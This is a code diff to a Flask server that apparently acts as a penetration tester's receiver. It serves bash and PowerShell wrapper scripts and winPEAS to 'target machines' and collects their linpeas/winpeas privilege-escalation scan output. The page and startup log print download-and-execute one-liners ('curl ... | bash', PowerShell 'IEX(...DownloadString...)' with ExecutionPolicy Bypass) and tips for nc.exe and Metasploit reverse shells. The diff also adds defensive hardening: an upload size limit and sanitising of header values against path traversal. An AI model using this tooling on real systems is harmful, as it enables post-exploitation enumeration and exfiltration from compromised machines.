@@ -10,6 +10,7 @@ import hashlib
 import time
 import requests
 from flask import Flask, request, jsonify, send_from_directory, send_file, render_template_string
+from werkzeug.exceptions import RequestEntityTooLarge
 from datetime import datetime
 import json
 
@@ -21,10 +22,24 @@ REPORTS_DIR = "./reports"
 SCRIPTS_DIR = "./scripts"
 MAX_UPLOAD_SIZE = 10 * 1024 * 1024  # 10MB
 
+# Enforce the upload limit at the framework level (Flask rejects larger bodies
+# with HTTP 413 before they are buffered into memory).
+app.config['MAX_CONTENT_LENGTH'] = MAX_UPLOAD_SIZE
+
 # Create directories
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 os.makedirs(REPORTS_DIR, exist_ok=True)
 os.makedirs(SCRIPTS_DIR, exist_ok=True)
+
+
+def safe_token(value, fallback):
+    """Sanitise an attacker-controlled header value before using it in a
+    filename. Prevents path traversal (e.g. X-Hostname: ../../etc/foo) and
+    keeps names tidy."""
+    import re as _re
+    cleaned = _re.sub(r'[^A-Za-z0-9._-]', '_', (value or '').strip())
+    cleaned = cleaned.strip('.')  # no leading/trailing dots
+    return cleaned[:64] or fallback
 
 # Active sessions tracking
 active_sessions = {}
@@ -111,27 +126,20 @@ def index():
 curl -sSL http://{request.host}/get-script | bash
         </code>
         
-        <p><strong>🪟 Windows CMD/PowerShell (Interactive):</strong></p>
+        <p><strong>🪟 Windows (PowerShell / reverse shell):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{request.host}/get-script.ps1')"
         </code>
-        
-        <p><strong>🪟 Windows Netcat/Reverse Shell (RECOMMENDED):</strong></p>
-        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{request.host}/wrapper-inline.ps1')"
-        </code>
-        
+
         <div style="background: #2a1a00; border-left: 4px solid #ff9900; padding: 10px; margin: 15px 0;">
-            <strong style="color: #ff9900;">⚠️ IMPORTANT - Windows Shell Compatibility:</strong><br>
+            <strong style="color: #ff9900;">⚠️ Windows shell compatibility:</strong>
             <ul style="color: #ffcc66; margin: 10px 0;">
-                <li><strong style="color: #00ff00;">✅ BEST:</strong> Netcat CMD shell (nc.exe → cmd.exe → nc listener)</li>
-                <li><strong style="color: #ffff00;">⚠️ CAUTION:</strong> PowerShell reverse shells may break output or shell</li>
-                <li><strong style="color: #00ff00;">✅ WORKS:</strong> Metasploit shells have proper output handling</li>
-                <li><strong style="color: #00ff00;">✅ WORKS:</strong> Interactive PowerShell/CMD windows</li>
+                <li><strong style="color: #00ff00;">✅ BEST:</strong> nc.exe CMD shell, Metasploit, interactive PowerShell/CMD</li>
+                <li><strong style="color: #ffff00;">⚠️ CAUTION:</strong> PowerShell reverse shells may suppress live output</li>
             </ul>
             <p style="color: #ffcc66; margin: 5px 0;">
-                <em>If you see no output but uploads work: You're in a PowerShell reverse shell.<br>
-                Script still runs successfully - monitor your Kali receiver for upload confirmation!</em>
+                <em>No output but uploads work? You're in a PowerShell reverse shell — the scan still
+                runs, just watch this receiver for the upload confirmation.</em>
             </p>
         </div>
         
@@ -158,13 +166,6 @@ $r=Invoke-RestMethod http://{request.host}/get-winpeas -OutFile $env:TEMP\\w.exe
     """
 
 
-@app.route('/test.html')
-def serve_test():
-    """Serve test.html from root"""
-    log(f"[→] Serving test.html to {request.remote_addr}")
-    return send_file('test.html')
-
-
 @app.route('/get-script')
 def get_script():
     """Serve the wrapper script (bash) to target machine"""
@@ -181,17 +182,6 @@ def get_script_ps1():
     """Serve the wrapper script (PowerShell) to target machine"""
     log(f"[→] Serving wrapper.ps1 to {request.remote_addr}")
     with open('wrapper.ps1', 'r', encoding='utf-8') as f:
-        script = f.read()
-    # Replace placeholder with actual server URL
-    script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
-    return script, 200, {'Content-Type': 'text/plain; charset=utf-8'}
-
-
-@app.route('/wrapper-inline.ps1')
-def get_wrapper_inline():
-    """Serve the inline wrapper (PowerShell one-liner) to target machine"""
-    log(f"[→] Serving wrapper-inline.ps1 to {request.remote_addr}")
-    with open('wrapper-inline.ps1', 'r', encoding='utf-8') as f:
         script = f.read()
     # Replace placeholder with actual server URL
     script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
@@ -222,10 +212,11 @@ def get_winpeas():
 def upload():
     """Receive linpeas/winpeas output"""
     try:
-        # Get session info
+        # Get session info (header values are attacker-controlled -> sanitise
+        # the two that end up in a filename).
         session_id = request.headers.get('X-Session-ID', f'session_{int(time.time())}')
-        hostname = request.headers.get('X-Hostname', 'unknown')
-        scan_type = request.headers.get('X-Scan-Type', 'linpeas')
+        hostname = safe_token(request.headers.get('X-Hostname'), 'unknown')
+        scan_type = safe_token(request.headers.get('X-Scan-Type'), 'linpeas')
         
         log("")
         log("="*60)
@@ -294,7 +285,11 @@ def upload():
         log("")
         
         return jsonify(response_data), 200
-        
+
+    except RequestEntityTooLarge:
+        limit_mb = MAX_UPLOAD_SIZE // (1024 * 1024)
+        log(f"[!] Rejected upload over {limit_mb}MB limit")
+        return jsonify({'error': f'Upload exceeds {limit_mb}MB limit'}), 413
     except Exception as e:
         log(f"[!] ERROR in upload handler: {str(e)}")
         import traceback
@@ -343,7 +338,7 @@ if __name__ == '__main__':
     
     log(f"[+] Starting server...\n")
     log(f"[+] Linux:       curl -sSL http://YOUR_IP:8000/get-script | bash")
-    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/wrapper-inline.ps1')\"")
+    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1')\"")
     log("")
     log(f"⚠️  Windows Shell Compatibility:")
     log(f"   ✅ BEST: nc.exe CMD shells (full output visibility)")
